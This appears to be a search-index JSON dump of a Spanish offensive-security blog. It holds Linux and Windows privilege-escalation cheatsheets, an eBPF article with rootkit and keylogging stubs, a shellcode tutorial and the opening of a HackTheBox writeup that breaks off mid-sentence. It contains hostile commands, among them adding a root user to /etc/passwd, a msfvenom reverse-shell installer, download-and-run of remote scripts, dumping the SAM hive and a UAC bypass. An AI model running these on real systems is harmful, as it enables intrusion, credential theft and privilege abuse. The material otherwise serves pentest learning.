{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"0x574R <p>offensive security research</p> Writeups <p>CTF machines and vulnerability analysis</p> Cheatsheets <p>Quick references for pentesting</p> Malware Dev <p>Shellcode, evasion, offensive techniques</p> Kernel <p>eBPF, rootkits, low-level programming</p>"},{"location":"#recent","title":"Recent","text":"Date Category Title 2025-01-09 kernel eBPF Introduction 2025-01-08 cheatsheet Linux Privilege Escalation 2025-01-07 malware Shellcode Basics"},{"location":"#contact","title":"Contact","text":"<p>github.com/0x574R</p>"},{"location":"tags/","title":"Tags","text":"<p>Explora contenido por etiquetas.</p>"},{"location":"blog/","title":"Blog","text":"<p>\u00daltimas publicaciones y novedades.</p>"},{"location":"cheatsheets/","title":"Cheatsheets","text":"<p>Referencias r\u00e1pidas para pentesting y post-explotaci\u00f3n.</p>"},{"location":"cheatsheets/#disponibles","title":"Disponibles","text":"<ul> <li>Linux Privilege Escalation</li> <li>Windows Privilege Escalation</li> </ul>"},{"location":"cheatsheets/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Active Directory</li> <li>Web Application Testing</li> <li>Reverse Shells</li> </ul>"},{"location":"cheatsheets/linux-privesc/","title":"Linux Privilege Escalation","text":""},{"location":"cheatsheets/linux-privesc/#enumeracion-inicial","title":"Enumeraci\u00f3n Inicial","text":""},{"location":"cheatsheets/linux-privesc/#sistema","title":"Sistema","text":"<pre><code># Info del sistema\nuname -a\ncat /etc/os-release\nhostname\n\n# Usuarios\nid\nwhoami\ncat /etc/passwd | grep -v nologin\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#herramientas-automaticas","title":"Herramientas Autom\u00e1ticas","text":"LinPEASLinEnum <pre><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n</code></pre> <pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\nchmod +x LinEnum.sh &amp;&amp; ./LinEnum.sh\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#vectores-de-escalada","title":"Vectores de Escalada","text":""},{"location":"cheatsheets/linux-privesc/#suidsgid","title":"SUID/SGID","text":"<pre><code># Buscar binarios SUID\nfind / -perm -4000 2&gt;/dev/null\n\n# Buscar binarios SGID\nfind / -perm -2000 2&gt;/dev/null\n\n# Buscar capabilities\ngetcap -r / 2&gt;/dev/null\n</code></pre> <p>GTFOBins</p> <p>Consulta GTFOBins para explotar binarios SUID</p>"},{"location":"cheatsheets/linux-privesc/#sudo","title":"Sudo","text":"<pre><code># Permisos sudo\nsudo -l\n\n# Versi\u00f3n de sudo (CVE-2021-4034, etc)\nsudo --version\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#cron-jobs","title":"Cron Jobs","text":"<pre><code># Listar cron jobs\ncat /etc/crontab\nls -la /etc/cron.*\ncrontab -l\n\n# Monitorear procesos\n# Usando pspy\n./pspy64\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#archivos-con-permisos-debiles","title":"Archivos con Permisos D\u00e9biles","text":"<pre><code># Archivos escribibles\nfind / -writable -type f 2&gt;/dev/null\n\n# /etc/passwd escribible\nls -la /etc/passwd\n# Si es escribible:\necho 'root2:$(openssl passwd password):0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#kernel-exploits","title":"Kernel Exploits","text":"<pre><code># Versi\u00f3n del kernel\nuname -r\n\n# Buscar exploits\nsearchsploit linux kernel $(uname -r)\n</code></pre> <p>\u00daltimo recurso</p> <p>Los kernel exploits pueden causar inestabilidad. Usar solo si otros m\u00e9todos fallan.</p>"},{"location":"cheatsheets/linux-privesc/#tecnicas-comunes","title":"T\u00e9cnicas Comunes","text":""},{"location":"cheatsheets/linux-privesc/#path-hijacking","title":"Path Hijacking","text":"<pre><code># Si un binario SUID ejecuta comandos sin ruta absoluta\necho '/bin/bash' &gt; /tmp/comando\nchmod +x /tmp/comando\nexport PATH=/tmp:$PATH\n./binario_vulnerable\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#library-hijacking","title":"Library Hijacking","text":"<pre><code># Buscar librer\u00edas faltantes\nldd /path/to/binary\nstrace /path/to/binary 2&gt;&amp;1 | grep \"open.*\\.so\"\n</code></pre>"},{"location":"cheatsheets/linux-privesc/#docker-escape","title":"Docker Escape","text":"<pre><code># Verificar si estamos en Docker\ncat /proc/1/cgroup | grep docker\n\n# Si el socket est\u00e1 montado\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre>"},{"location":"cheatsheets/windows-privesc/","title":"Windows Privilege Escalation","text":""},{"location":"cheatsheets/windows-privesc/#enumeracion-inicial","title":"Enumeraci\u00f3n Inicial","text":""},{"location":"cheatsheets/windows-privesc/#sistema","title":"Sistema","text":"<pre><code># Info del sistema\nsysteminfo\nhostname\nwhoami /all\n\n# Usuarios y grupos\nnet user\nnet localgroup Administrators\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#herramientas-automaticas","title":"Herramientas Autom\u00e1ticas","text":"WinPEASPowerUp <pre><code># Descargar y ejecutar\nIEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\n</code></pre> <pre><code>Import-Module .\\PowerUp.ps1\nInvoke-AllChecks\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#vectores-de-escalada","title":"Vectores de Escalada","text":""},{"location":"cheatsheets/windows-privesc/#servicios","title":"Servicios","text":"<pre><code># Listar servicios\nGet-Service\nsc query state= all\n\n# Permisos de servicios\naccesschk.exe /accepteula -uwcqv \"Users\" *\n\n# Modificar binario de servicio\nsc config [service] binpath= \"C:\\path\\to\\payload.exe\"\nsc stop [service]\nsc start [service]\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#unquoted-service-path","title":"Unquoted Service Path","text":"<pre><code># Buscar rutas sin comillas\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"\n</code></pre> <p>Explotaci\u00f3n</p> <p>Si el path es <code>C:\\Program Files\\Service Folder\\binary.exe</code></p> <p>Colocar payload en <code>C:\\Program.exe</code> o <code>C:\\Program Files\\Service.exe</code></p>"},{"location":"cheatsheets/windows-privesc/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<pre><code># Verificar\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Explotar con msfvenom\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi\nmsiexec /quiet /qn /i shell.msi\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#credenciales-guardadas","title":"Credenciales Guardadas","text":"<pre><code># Credenciales en registro\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n\n# Archivos de configuraci\u00f3n\nfindstr /si password *.txt *.ini *.config\n\n# SAM y SYSTEM (si son accesibles)\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#token-impersonation","title":"Token Impersonation","text":"<pre><code># Verificar privilegios\nwhoami /priv\n</code></pre> <p>Privilegios explotables</p> <ul> <li><code>SeImpersonatePrivilege</code> \u2192 Potato attacks</li> <li><code>SeAssignPrimaryToken</code> \u2192 Token manipulation</li> <li><code>SeBackupPrivilege</code> \u2192 Read any file</li> <li><code>SeRestorePrivilege</code> \u2192 Write any file</li> </ul> PrintSpooferGodPotato <pre><code>PrintSpoofer.exe -i -c cmd\n</code></pre> <pre><code>GodPotato.exe -cmd \"cmd /c whoami\"\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code># Listar tareas\nschtasks /query /fo LIST /v\n\n# Buscar scripts modificables\nicacls C:\\path\\to\\script.bat\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#tecnicas-adicionales","title":"T\u00e9cnicas Adicionales","text":""},{"location":"cheatsheets/windows-privesc/#dll-hijacking","title":"DLL Hijacking","text":"<pre><code># Buscar DLLs faltantes con Process Monitor\n# Filtrar por \"NAME NOT FOUND\" y \".dll\"\n</code></pre>"},{"location":"cheatsheets/windows-privesc/#uac-bypass","title":"UAC Bypass","text":"<pre><code># Verificar nivel de UAC\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\n# fodhelper bypass\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\nfodhelper.exe\n</code></pre>"},{"location":"kernel/","title":"Kernel","text":"<p>Notas sobre programaci\u00f3n a nivel de kernel, rootkits y eBPF.</p>"},{"location":"kernel/#articulos","title":"Art\u00edculos","text":"<ul> <li>Introducci\u00f3n a eBPF - Fundamentos de eBPF para seguridad</li> </ul>"},{"location":"kernel/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Kernel Module Development</li> <li>Inline Hooking</li> <li>Syscall Hijacking</li> <li>Rootkit Techniques</li> </ul>"},{"location":"kernel/ebpf-intro/","title":"Introducci\u00f3n a eBPF","text":""},{"location":"kernel/ebpf-intro/#que-es-ebpf","title":"\u00bfQu\u00e9 es eBPF?","text":"<p>eBPF (extended Berkeley Packet Filter) es una tecnolog\u00eda que permite ejecutar c\u00f3digo en el kernel de Linux sin modificarlo. Originalmente dise\u00f1ado para filtrado de paquetes, ahora se usa para observabilidad, seguridad y networking.</p> <pre><code>graph LR\n    A[Programa eBPF] --&gt; B[Verificador]\n    B --&gt; C[JIT Compiler]\n    C --&gt; D[Kernel]\n    D --&gt; E[Hook Points]\n</code></pre>"},{"location":"kernel/ebpf-intro/#casos-de-uso-en-seguridad","title":"Casos de Uso en Seguridad","text":"Uso Descripci\u00f3n Tracing Monitorear syscalls, funciones del kernel Security Detectar comportamiento malicioso Rootkits Ocultar procesos, archivos, conexiones EDR Evasion Bypass de herramientas de seguridad"},{"location":"kernel/ebpf-intro/#arquitectura","title":"Arquitectura","text":""},{"location":"kernel/ebpf-intro/#hook-points","title":"Hook Points","text":"<p>eBPF puede attacharse a varios puntos:</p> <ul> <li>kprobes: Cualquier funci\u00f3n del kernel</li> <li>tracepoints: Puntos de trace predefinidos</li> <li>XDP: Procesamiento de paquetes en driver</li> <li>LSM: Linux Security Module hooks</li> </ul>"},{"location":"kernel/ebpf-intro/#maps","title":"Maps","text":"<p>Estructuras de datos compartidas entre kernel y userspace:</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 1024);\n    __type(key, u32);\n    __type(value, u64);\n} my_map SEC(\".maps\");\n</code></pre>"},{"location":"kernel/ebpf-intro/#ejemplo-tracing-syscalls","title":"Ejemplo: Tracing Syscalls","text":""},{"location":"kernel/ebpf-intro/#programa-ebpf","title":"Programa eBPF","text":"<pre><code>// trace_execve.bpf.c\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nSEC(\"tracepoint/syscalls/sys_enter_execve\")\nint trace_execve(struct trace_event_raw_sys_enter *ctx) {\n    u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    char comm[16];\n\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n    bpf_printk(\"execve called by PID %d (%s)\", pid, comm);\n\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre>"},{"location":"kernel/ebpf-intro/#compilacion","title":"Compilaci\u00f3n","text":"<pre><code>clang -O2 -target bpf -c trace_execve.bpf.c -o trace_execve.bpf.o\n</code></pre>"},{"location":"kernel/ebpf-intro/#carga-con-bpftool","title":"Carga con bpftool","text":"<pre><code># Cargar programa\nbpftool prog load trace_execve.bpf.o /sys/fs/bpf/trace_execve\n\n# Attach al tracepoint\nbpftool prog attach /sys/fs/bpf/trace_execve tracepoint syscalls sys_enter_execve\n\n# Ver output\ncat /sys/kernel/debug/tracing/trace_pipe\n</code></pre>"},{"location":"kernel/ebpf-intro/#herramientas","title":"Herramientas","text":""},{"location":"kernel/ebpf-intro/#bpftool","title":"bpftool","text":"<pre><code># Listar programas cargados\nbpftool prog list\n\n# Ver maps\nbpftool map list\n\n# Dump de programa\nbpftool prog dump xlated id &lt;ID&gt;\n</code></pre>"},{"location":"kernel/ebpf-intro/#libbpf-skeleton","title":"libbpf + skeleton","text":"Generar skeletonUserspace loader <pre><code>bpftool gen skeleton trace_execve.bpf.o &gt; trace_execve.skel.h\n</code></pre> <pre><code>#include \"trace_execve.skel.h\"\n\nint main() {\n    struct trace_execve_bpf *skel;\n\n    skel = trace_execve_bpf__open_and_load();\n    trace_execve_bpf__attach(skel);\n\n    // Keep running...\n    sleep(99999);\n\n    trace_execve_bpf__destroy(skel);\n    return 0;\n}\n</code></pre>"},{"location":"kernel/ebpf-intro/#aplicaciones-ofensivas","title":"Aplicaciones Ofensivas","text":"<p>Uso \u00e9tico</p> <p>Estas t\u00e9cnicas son para investigaci\u00f3n y red teaming autorizado.</p>"},{"location":"kernel/ebpf-intro/#ocultar-procesos","title":"Ocultar Procesos","text":"<pre><code>SEC(\"kprobe/proc_pid_readdir\")\nint hide_process(struct pt_regs *ctx) {\n    // Manipular iteraci\u00f3n de /proc\n    // para ocultar PIDs espec\u00edficos\n}\n</code></pre>"},{"location":"kernel/ebpf-intro/#interceptar-credenciales","title":"Interceptar Credenciales","text":"<pre><code>SEC(\"kprobe/__sys_read\")\nint intercept_read(struct pt_regs *ctx) {\n    // Capturar datos le\u00eddos de stdin\n    // \u00fatil para keylogging\n}\n</code></pre>"},{"location":"kernel/ebpf-intro/#recursos","title":"Recursos","text":"Recurso URL eBPF.io https://ebpf.io libbpf-bootstrap https://github.com/libbpf/libbpf-bootstrap bcc tools https://github.com/iovisor/bcc <p>Siguiente</p> <p>En el pr\u00f3ximo art\u00edculo veremos desarrollo de m\u00f3dulos del kernel.</p>"},{"location":"malware-dev/","title":"Malware Development","text":"<p>Notas sobre desarrollo de malware, t\u00e9cnicas de evasi\u00f3n y programaci\u00f3n ofensiva.</p> <p>Disclaimer</p> <p>Este contenido es \u00fanicamente con fines educativos e investigaci\u00f3n en seguridad. Uso responsable.</p>"},{"location":"malware-dev/#articulos","title":"Art\u00edculos","text":"<ul> <li>Shellcode Basics - Fundamentos de desarrollo de shellcode</li> </ul>"},{"location":"malware-dev/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Process Injection Techniques</li> <li>AV/EDR Evasion</li> <li>Persistence Mechanisms</li> <li>C2 Development</li> </ul>"},{"location":"malware-dev/shellcode-basics/","title":"Shellcode Basics","text":""},{"location":"malware-dev/shellcode-basics/#que-es-shellcode","title":"\u00bfQu\u00e9 es Shellcode?","text":"<p>Shellcode es c\u00f3digo m\u00e1quina dise\u00f1ado para ser inyectado y ejecutado en la memoria de un proceso. Se llama \"shellcode\" porque tradicionalmente su objetivo era obtener una shell.</p>"},{"location":"malware-dev/shellcode-basics/#caracteristicas","title":"Caracter\u00edsticas","text":"<ul> <li>Position Independent: No depende de direcciones absolutas</li> <li>Null-free: Evita bytes nulos (<code>0x00</code>) que terminan strings</li> <li>Peque\u00f1o: Minimiza el tama\u00f1o para caber en buffers limitados</li> </ul>"},{"location":"malware-dev/shellcode-basics/#desarrollo-basico","title":"Desarrollo B\u00e1sico","text":""},{"location":"malware-dev/shellcode-basics/#estructura-x86-64","title":"Estructura x86-64","text":"<pre><code>; exit.asm - Syscall exit(0)\nsection .text\n    global _start\n\n_start:\n    xor rdi, rdi        ; rdi = 0 (exit code)\n    mov al, 60          ; syscall number (exit)\n    syscall\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#compilacion","title":"Compilaci\u00f3n","text":"<pre><code># Ensamblar\nnasm -f elf64 exit.asm -o exit.o\n\n# Linkear\nld exit.o -o exit\n\n# Extraer shellcode\nobjcopy -O binary exit exit.bin\nxxd -i exit.bin\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#extraccion-con-objdump","title":"Extracci\u00f3n con objdump","text":"<pre><code>objdump -d exit | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#tecnicas-comunes","title":"T\u00e9cnicas Comunes","text":""},{"location":"malware-dev/shellcode-basics/#evitar-null-bytes","title":"Evitar Null Bytes","text":"\u274c Malo\u2705 Bueno <pre><code>mov rax, 0      ; Contiene 0x00\nmov rdi, 0\n</code></pre> <pre><code>xor rax, rax    ; rax = 0, sin null bytes\nxor rdi, rdi\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#push-string","title":"Push String","text":"<pre><code>; Push \"/bin/sh\" a la pila\nxor rax, rax\npush rax                    ; null terminator\nmov rdi, 0x68732f6e69622f   ; /bin/sh en little endian\npush rdi\nmov rdi, rsp                ; rdi apunta al string\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#shellcode-loader-en-c","title":"Shellcode Loader en C","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/mman.h&gt;\n\nunsigned char shellcode[] = \n    \"\\x48\\x31\\xff\"      // xor rdi, rdi\n    \"\\xb0\\x3c\"          // mov al, 60\n    \"\\x0f\\x05\";         // syscall\n\nint main() {\n    void *exec = mmap(NULL, sizeof(shellcode), \n                      PROT_READ | PROT_WRITE | PROT_EXEC,\n                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n\n    memcpy(exec, shellcode, sizeof(shellcode));\n    ((void(*)())exec)();\n\n    return 0;\n}\n</code></pre> <pre><code>gcc -z execstack -o loader loader.c\n./loader\n</code></pre>"},{"location":"malware-dev/shellcode-basics/#recursos","title":"Recursos","text":"Recurso Descripci\u00f3n Syscall Table Tabla de syscalls x86-64 Shell-Storm Base de datos de shellcodes pwntools Framework para exploit dev <p>Siguiente paso</p> <p>En el pr\u00f3ximo art\u00edculo veremos t\u00e9cnicas de inyecci\u00f3n de procesos.</p>"},{"location":"research/","title":"Research","text":"Malware Dev <p>Shellcode, injection, evasion</p> Kernel <p>eBPF, rootkits, syscalls</p>"},{"location":"research/kernel/","title":"Kernel","text":"<p>Notas sobre programaci\u00f3n a nivel de kernel, rootkits y eBPF.</p>"},{"location":"research/kernel/#articulos","title":"Art\u00edculos","text":"<ul> <li>Introducci\u00f3n a eBPF - Fundamentos de eBPF para seguridad</li> </ul>"},{"location":"research/kernel/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Kernel Module Development</li> <li>Inline Hooking</li> <li>Syscall Hijacking</li> <li>Rootkit Techniques</li> </ul>"},{"location":"research/kernel/ebpf-intro/","title":"Introducci\u00f3n a eBPF","text":""},{"location":"research/kernel/ebpf-intro/#que-es-ebpf","title":"\u00bfQu\u00e9 es eBPF?","text":"<p>eBPF (extended Berkeley Packet Filter) es una tecnolog\u00eda que permite ejecutar c\u00f3digo en el kernel de Linux sin modificarlo. Originalmente dise\u00f1ado para filtrado de paquetes, ahora se usa para observabilidad, seguridad y networking.</p> <pre><code>graph LR\n    A[Programa eBPF] --&gt; B[Verificador]\n    B --&gt; C[JIT Compiler]\n    C --&gt; D[Kernel]\n    D --&gt; E[Hook Points]\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#casos-de-uso-en-seguridad","title":"Casos de Uso en Seguridad","text":"Uso Descripci\u00f3n Tracing Monitorear syscalls, funciones del kernel Security Detectar comportamiento malicioso Rootkits Ocultar procesos, archivos, conexiones EDR Evasion Bypass de herramientas de seguridad"},{"location":"research/kernel/ebpf-intro/#arquitectura","title":"Arquitectura","text":""},{"location":"research/kernel/ebpf-intro/#hook-points","title":"Hook Points","text":"<p>eBPF puede attacharse a varios puntos:</p> <ul> <li>kprobes: Cualquier funci\u00f3n del kernel</li> <li>tracepoints: Puntos de trace predefinidos</li> <li>XDP: Procesamiento de paquetes en driver</li> <li>LSM: Linux Security Module hooks</li> </ul>"},{"location":"research/kernel/ebpf-intro/#maps","title":"Maps","text":"<p>Estructuras de datos compartidas entre kernel y userspace:</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 1024);\n    __type(key, u32);\n    __type(value, u64);\n} my_map SEC(\".maps\");\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#ejemplo-tracing-syscalls","title":"Ejemplo: Tracing Syscalls","text":""},{"location":"research/kernel/ebpf-intro/#programa-ebpf","title":"Programa eBPF","text":"<pre><code>// trace_execve.bpf.c\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nSEC(\"tracepoint/syscalls/sys_enter_execve\")\nint trace_execve(struct trace_event_raw_sys_enter *ctx) {\n    u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    char comm[16];\n\n    bpf_get_current_comm(&amp;comm, sizeof(comm));\n    bpf_printk(\"execve called by PID %d (%s)\", pid, comm);\n\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#compilacion","title":"Compilaci\u00f3n","text":"<pre><code>clang -O2 -target bpf -c trace_execve.bpf.c -o trace_execve.bpf.o\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#carga-con-bpftool","title":"Carga con bpftool","text":"<pre><code># Cargar programa\nbpftool prog load trace_execve.bpf.o /sys/fs/bpf/trace_execve\n\n# Attach al tracepoint\nbpftool prog attach /sys/fs/bpf/trace_execve tracepoint syscalls sys_enter_execve\n\n# Ver output\ncat /sys/kernel/debug/tracing/trace_pipe\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#herramientas","title":"Herramientas","text":""},{"location":"research/kernel/ebpf-intro/#bpftool","title":"bpftool","text":"<pre><code># Listar programas cargados\nbpftool prog list\n\n# Ver maps\nbpftool map list\n\n# Dump de programa\nbpftool prog dump xlated id &lt;ID&gt;\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#libbpf-skeleton","title":"libbpf + skeleton","text":"Generar skeletonUserspace loader <pre><code>bpftool gen skeleton trace_execve.bpf.o &gt; trace_execve.skel.h\n</code></pre> <pre><code>#include \"trace_execve.skel.h\"\n\nint main() {\n    struct trace_execve_bpf *skel;\n\n    skel = trace_execve_bpf__open_and_load();\n    trace_execve_bpf__attach(skel);\n\n    // Keep running...\n    sleep(99999);\n\n    trace_execve_bpf__destroy(skel);\n    return 0;\n}\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#aplicaciones-ofensivas","title":"Aplicaciones Ofensivas","text":"<p>Uso \u00e9tico</p> <p>Estas t\u00e9cnicas son para investigaci\u00f3n y red teaming autorizado.</p>"},{"location":"research/kernel/ebpf-intro/#ocultar-procesos","title":"Ocultar Procesos","text":"<pre><code>SEC(\"kprobe/proc_pid_readdir\")\nint hide_process(struct pt_regs *ctx) {\n    // Manipular iteraci\u00f3n de /proc\n    // para ocultar PIDs espec\u00edficos\n}\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#interceptar-credenciales","title":"Interceptar Credenciales","text":"<pre><code>SEC(\"kprobe/__sys_read\")\nint intercept_read(struct pt_regs *ctx) {\n    // Capturar datos le\u00eddos de stdin\n    // \u00fatil para keylogging\n}\n</code></pre>"},{"location":"research/kernel/ebpf-intro/#recursos","title":"Recursos","text":"Recurso URL eBPF.io https://ebpf.io libbpf-bootstrap https://github.com/libbpf/libbpf-bootstrap bcc tools https://github.com/iovisor/bcc <p>Siguiente</p> <p>En el pr\u00f3ximo art\u00edculo veremos desarrollo de m\u00f3dulos del kernel.</p>"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Notas sobre desarrollo de malware, t\u00e9cnicas de evasi\u00f3n y programaci\u00f3n ofensiva.</p> <p>Disclaimer</p> <p>Este contenido es \u00fanicamente con fines educativos e investigaci\u00f3n en seguridad. Uso responsable.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"<ul> <li>Shellcode Basics - Fundamentos de desarrollo de shellcode</li> </ul>"},{"location":"research/malware-dev/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Process Injection Techniques</li> <li>AV/EDR Evasion</li> <li>Persistence Mechanisms</li> <li>C2 Development</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/","title":"Shellcode Basics","text":""},{"location":"research/malware-dev/shellcode-basics/#que-es-shellcode","title":"\u00bfQu\u00e9 es Shellcode?","text":"<p>Shellcode es c\u00f3digo m\u00e1quina dise\u00f1ado para ser inyectado y ejecutado en la memoria de un proceso. Se llama \"shellcode\" porque tradicionalmente su objetivo era obtener una shell.</p>"},{"location":"research/malware-dev/shellcode-basics/#caracteristicas","title":"Caracter\u00edsticas","text":"<ul> <li>Position Independent: No depende de direcciones absolutas</li> <li>Null-free: Evita bytes nulos (<code>0x00</code>) que terminan strings</li> <li>Peque\u00f1o: Minimiza el tama\u00f1o para caber en buffers limitados</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/#desarrollo-basico","title":"Desarrollo B\u00e1sico","text":""},{"location":"research/malware-dev/shellcode-basics/#estructura-x86-64","title":"Estructura x86-64","text":"<pre><code>; exit.asm - Syscall exit(0)\nsection .text\n    global _start\n\n_start:\n    xor rdi, rdi        ; rdi = 0 (exit code)\n    mov al, 60          ; syscall number (exit)\n    syscall\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#compilacion","title":"Compilaci\u00f3n","text":"<pre><code># Ensamblar\nnasm -f elf64 exit.asm -o exit.o\n\n# Linkear\nld exit.o -o exit\n\n# Extraer shellcode\nobjcopy -O binary exit exit.bin\nxxd -i exit.bin\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#extraccion-con-objdump","title":"Extracci\u00f3n con objdump","text":"<pre><code>objdump -d exit | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#tecnicas-comunes","title":"T\u00e9cnicas Comunes","text":""},{"location":"research/malware-dev/shellcode-basics/#evitar-null-bytes","title":"Evitar Null Bytes","text":"\u274c Malo\u2705 Bueno <pre><code>mov rax, 0      ; Contiene 0x00\nmov rdi, 0\n</code></pre> <pre><code>xor rax, rax    ; rax = 0, sin null bytes\nxor rdi, rdi\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#push-string","title":"Push String","text":"<pre><code>; Push \"/bin/sh\" a la pila\nxor rax, rax\npush rax                    ; null terminator\nmov rdi, 0x68732f6e69622f   ; /bin/sh en little endian\npush rdi\nmov rdi, rsp                ; rdi apunta al string\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#shellcode-loader-en-c","title":"Shellcode Loader en C","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/mman.h&gt;\n\nunsigned char shellcode[] = \n    \"\\x48\\x31\\xff\"      // xor rdi, rdi\n    \"\\xb0\\x3c\"          // mov al, 60\n    \"\\x0f\\x05\";         // syscall\n\nint main() {\n    void *exec = mmap(NULL, sizeof(shellcode), \n                      PROT_READ | PROT_WRITE | PROT_EXEC,\n                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n\n    memcpy(exec, shellcode, sizeof(shellcode));\n    ((void(*)())exec)();\n\n    return 0;\n}\n</code></pre> <pre><code>gcc -z execstack -o loader loader.c\n./loader\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#recursos","title":"Recursos","text":"Recurso Descripci\u00f3n Syscall Table Tabla de syscalls x86-64 Shell-Storm Base de datos de shellcodes pwntools Framework para exploit dev <p>Siguiente paso</p> <p>En el pr\u00f3ximo art\u00edculo veremos t\u00e9cnicas de inyecci\u00f3n de procesos.</p>"},{"location":"writeups/","title":"Writeups","text":"<p>Resoluciones de m\u00e1quinas CTF y an\u00e1lisis de vulnerabilidades.</p>"},{"location":"writeups/#hackthebox","title":"HackTheBox","text":"M\u00e1quina Dificultad OS Fecha Example \ud83d\udfe2 Easy Linux 2025-01-09"},{"location":"writeups/#tryhackme","title":"TryHackMe","text":"<p>Pr\u00f3ximamente...</p>"},{"location":"writeups/#vulnhub","title":"Vulnhub","text":"<p>Pr\u00f3ximamente...</p>"},{"location":"writeups/htb-example/","title":"HTB - Example Machine","text":"<p>Informaci\u00f3n</p> <ul> <li>OS: Linux</li> <li>Dificultad: \ud83d\udfe2 Easy</li> <li>IP: 10.10.10.XX</li> <li>T\u00e9cnicas: SQL Injection, SUID Exploitation</li> </ul>"},{"location":"writeups/htb-example/#reconocimiento","title":"Reconocimiento","text":""},{"location":"writeups/htb-example/#nmap","title":"Nmap","text":"<pre><code>nmap -sCV -p- --min-rate 5000 10.10.10.XX -oN nmap.txt\n</code></pre> Resultado<pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    Apache httpd 2.4.41\n</code></pre>"},{"location":"writeups/htb-example/#web-enumeration","title":"Web Enumeration","text":"<pre><code>gobuster dir -u http://10.10.10.XX -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>Hallazgo</p> <p>Encontrado panel de login en 